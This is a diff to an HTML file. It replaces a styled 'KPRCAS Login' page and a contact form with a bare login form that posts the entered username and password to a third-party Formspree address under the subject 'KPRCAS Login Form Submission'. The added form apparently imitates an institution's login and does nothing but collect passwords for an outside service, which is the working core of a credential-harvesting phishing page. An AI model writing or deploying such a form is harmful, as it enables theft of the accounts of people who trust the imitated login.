@@ -1,178 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>KPRCAS Login</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            margin: 0;
-            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1f4fa3, #2e8b57);
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+<form action="https://formspree.io/f/mzdppkzb" method="POST">
 
-        .login-container {
-            background: #ffffff;
-            width: 100%;
-            max-width: 380px;
-            padding: 35px;
-            border-radius: 12px;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
-            text-align: center;
-        }
-
-        .logo img {
-            width: 160px;
-            margin-bottom: 15px;
-        }
-
-        h2 {
-            margin-bottom: 25px;
-            color: #1f4fa3;
-        }
-
-        .input-group {
-            text-align: left;
-            margin-bottom: 18px;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 14px;
-            margin-bottom: 6px;
-            color: #333;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 10px;
-            border-radius: 6px;
-            border: 1px solid #ccc;
-            font-size: 15px;
-        }
-
-        .input-group input:focus {
-            outline: none;
-            border-color: #1f4fa3;
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 6px;
-            background: #1f4fa3;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s ease;
-        }
-
-        .login-btn:hover {
-            background: #163b7a;
-        }
-
-        .footer-text {
-            margin-top: 18px;
-            font-size: 13px;
-            color: #555;
-        }
-    </style>
-</head>
-<body>
-
-    <div class="login-container">
-        <div class="logo">
-            <img src="KPRCAS.jpg" alt="KPRCAS Logo">
-        </div>
-
-        <h2>Login</h2>
-
-        <form>
-            <div class="input-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" placeholder="Enter username" required>
-            </div>
-
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter password" required>
-            </div>
-
-            <button type="submit" class="login-btn">Login</button>
-        </form>
-
-        <div class="footer-text">
-            © KPRCAS | Learn Beyond
-        </div>
+    <div class="input-group">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" placeholder="Enter username" required>
     </div>
 
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Contact Form</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f4f6f8;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        form {
-            background: #fff;
-            padding: 25px;
-            border-radius: 8px;
-            width: 320px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-        h2 {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        input, textarea, button {
-            width: 100%;
-            margin-bottom: 12px;
-            padding: 10px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            font-size: 14px;
-        }
-        button {
-            background: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #0056b3;
-        }
-    </style>
-</head>
-<body>
+    <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter password" required>
+    </div>
 
-<form action="https://formspree.io/f/mzdppkzb" method="POST">
-    <h2>Contact Us</h2>
+    <!-- Optional subject -->
+    <input type="hidden" name="_subject" value="KPRCAS Login Form Submission">
 
-    <input type="text" name="name" placeholder="Your Name" required>
+    <!-- Optional redirect after submit -->
+    <!-- <input type="hidden" name="_redirect" value="thankyou.html"> -->
 
-    <input type="email" name="email" placeholder="Your Email" required>
-
-    <textarea name="message" rows="4" placeholder="Your Message" required></textarea>
-
-    <!-- Optional: Redirect after submit -->
-    <!-- <input type="hidden" name="_redirect" value="https://yourwebsite.com/thank-you.html"> -->
-
-    <button type="submit">Send Message</button>
+    <button type="submit" class="login-btn">Login</button>
 </form>
-
-</body>
-</html>
